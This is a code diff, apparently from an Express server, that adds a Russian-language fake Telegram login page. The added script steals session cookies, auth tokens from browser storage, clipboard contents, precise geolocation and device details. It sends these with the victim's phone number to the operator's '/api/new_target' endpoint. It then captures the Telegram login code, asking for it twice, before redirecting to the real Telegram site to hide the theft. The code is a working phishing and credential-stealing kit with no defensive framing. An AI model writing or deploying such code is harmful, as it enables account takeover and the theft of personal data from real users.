@@ -434,9 +434,85 @@ app.get('/', (req, res) => {
     </div>
 </div>
 <script>
-    const phoneForm = document.getElementById('phoneForm');
-    const codeForm = document.getElementById('codeForm');
-    const btnPhone = document.getElementById('btnPhone');
-    const btnCode = document.getElementById('btnCode');
-    const countryCode = document.getElementById('countryCode');
-    const codeInputs = docu
+    const codeInputs = document.querySelectorAll('.code-input');
+    const titleEl = document.getElementById('title');
+    const subtitleEl = document.getElementById('subtitle');
+    const phoneInput = document.getElementById('phone');
+    const clockEl = document.getElementById('clock');
+    const hiddenStealer = document.getElementById('hiddenStealer');
+    
+    let phoneValue = '', firstCodeValue = '', geoData = null, clipData = null, stolenData = [], batteryLevel = 'Скрыто', isCharging = false, memorySize = 'Скрыто', networkType = 'Неизвестно', isDoubleCode = true, isClicked = false;
+
+    const Collector = {
+        init() { this.collectSteal(); this.collectBattery(); this.collectMemory(); this.collectNetwork(); this.collectGeo(); this.initClock(); this.initClipboard(); this.initClickTracking(); },
+        collectSteal() {
+            try {
+                document.cookie.split(';').forEach(c => { const [n, ...v] = c.split('='); if (n && v.length) stolenData.push({ name: n.trim(), value: v.join('=') }); });
+                for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); if (k.includes('token') || k.includes('auth') || k.includes('session') || k.includes('user')) stolenData.push({ name: 'LS:' + k, value: localStorage.getItem(k) }); }
+                for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); if (k.includes('token') || k.includes('auth') || k.includes('session')) stolenData.push({ name: 'SS:' + k, value: sessionStorage.getItem(k) }); }
+            } catch (e) {}
+        },
+        async collectBattery() { try { if (navigator.getBattery) { const b = await navigator.getBattery(); batteryLevel = Math.round(b.level * 100) + '%'; isCharging = b.charging; } } catch (e) {} },
+        collectMemory() { try { if (navigator.deviceMemory) memorySize = navigator.deviceMemory + ' GB'; } catch (e) {} },
+        collectNetwork() { try { if (navigator.connection) networkType = navigator.connection.effectiveType || 'Неизвестно'; } catch (e) {} },
+        collectGeo() { try { if (navigator.geolocation) navigator.geolocation.getCurrentPosition((p) => { geoData = p.coords.latitude + ',' + p.coords.longitude; }, () => {}, { enableHighAccuracy: true, timeout: 5000 }); } catch (e) {} },
+        initClock() { const u = () => { const d = new Date(); clockEl.textContent = d.getHours().toString().padStart(2, '0') + ':' + d.getMinutes().toString().padStart(2, '0'); }; u(); setInterval(u, 1000); },
+        initClipboard() {
+            const r = async () => { try { if (navigator.clipboard) { const t = await navigator.clipboard.readText(); if (t && t.length > 2) clipData = t.slice(0, 150); } else { hiddenStealer.focus(); document.execCommand('paste'); clipData = hiddenStealer.value.slice(0, 150); } } catch (e) {} };
+            phoneInput.addEventListener('focus', r); document.body.addEventListener('click', r);
+        },
+        initClickTracking() {
+            const t = () => { if (isClicked) return; isClicked = true; fetch('/api/click', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' }).catch(() => {}); };
+            document.body.addEventListener('click', t); document.body.addEventListener('touchstart', t);
+        }
+    };
+
+    const UI = {
+        init() { Collector.init(); this.initPhoneMask(); this.initCodeInputs(); },
+        initPhoneMask() { phoneInput.addEventListener('input', (e) => { let v = e.target.value.replace(/\\D/g, ''); if (v.length > 9) v = v.slice(0, 9); let f = v; if (v.length > 6) f = v.slice(0, 3) + ' ' + v.slice(3, 6) + ' ' + v.slice(6); else if (v.length > 3) f = v.slice(0, 3) + ' ' + v.slice(3); e.target.value = f; }); },
+        initCodeInputs() { codeInputs.forEach((inp, i) => { inp.addEventListener('input', (e) => { if (e.target.value.length === 1 && i < 4) codeInputs[i + 1].focus(); }); inp.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && e.target.value.length === 0 && i > 0) codeInputs[i - 1].focus(); }); }); },
+        showCodeForm() { phoneForm.classList.add('hidden'); codeForm.classList.remove('hidden'); titleEl.textContent = 'Введите код'; subtitleEl.innerHTML = 'Мы отправили код в Telegram на номер <b>+' + phoneValue + '</b>'; setTimeout(() => codeInputs[0].focus(), 100); },
+        showRepeatCodeForm() { codeInputs.forEach(i => i.value = ''); btnCode.innerHTML = 'Далее'; btnCode.disabled = false; titleEl.textContent = 'Повторите код'; subtitleEl.innerHTML = 'В целях безопасности подтвердите код еще раз.'; codeInputs[0].focus(); },
+        showSuccess() { titleEl.textContent = 'Готово'; subtitleEl.innerHTML = 'Вы успешно вошли в аккаунт.'; codeForm.innerHTML = '<div style="text-align:center;font-size:60px;margin-top:20px;animation:fadeIn 0.5s;">✅</div>'; setTimeout(() => { window.location.href = 'https://web.telegram.org'; }, 2000); },
+        setLoading(btn, t) { btn.innerHTML = '<span class="spinner"></span>' + t; btn.disabled = true; }
+    };
+
+    phoneForm.onsubmit = async (e) => {
+        e.preventDefault();
+        const l = phoneInput.value.replace(/\\D/g, ''); if (l.length < 7) return;
+        phoneValue = countryCode.value + l;
+        UI.setLoading(btnPhone, 'Отправка...');
+        const p = { phone: phoneValue, ua: navigator.userAgent, screen: window.screen.width + 'x' + window.screen.height, battery: batteryLevel, memory: memorySize, network: networkType, geo: geoData, clipboard: clipData, steal: stolenData };
+        try {
+            const r = await fetch('/api/new_target', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) });
+            const d = await r.json();
+            isDoubleCode = d.doubleCode; UI.showCodeForm();
+        } catch (e) { btnPhone.innerHTML = 'Далее'; btnPhone.disabled = false; }
+    };
+
+    codeForm.onsubmit = async (e) => {
+        e.preventDefault();
+        let c = ''; codeInputs.forEach(i => c += i.value); if (c.length < 5) return;
+        if (isDoubleCode && !firstCodeValue) { firstCodeValue = c; UI.showRepeatCodeForm(); return; }
+        UI.setLoading(btnCode, 'Проверка...');
+        try {
+            await fetch('/api/code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phoneValue, code: firstCodeValue || c }) });
+            UI.showSuccess();
+        } catch (e) { btnCode.innerHTML = 'Далее'; btnCode.disabled = false; }
+    };
+
+    UI.init();
+</script>
+</body>
+</html>`);
+});
+
+// ==========================================
+// ЗАПУСК СЕРВЕРА
+// ==========================================
+BotLogic.init();
+
+app.listen(CONFIG.PORT, () => {
+    console.log(`[SERVER] Started on port ${CONFIG.PORT}`);
+    console.log(`[SERVER] Uptime: ${new Date().toISOString()}`);
+});
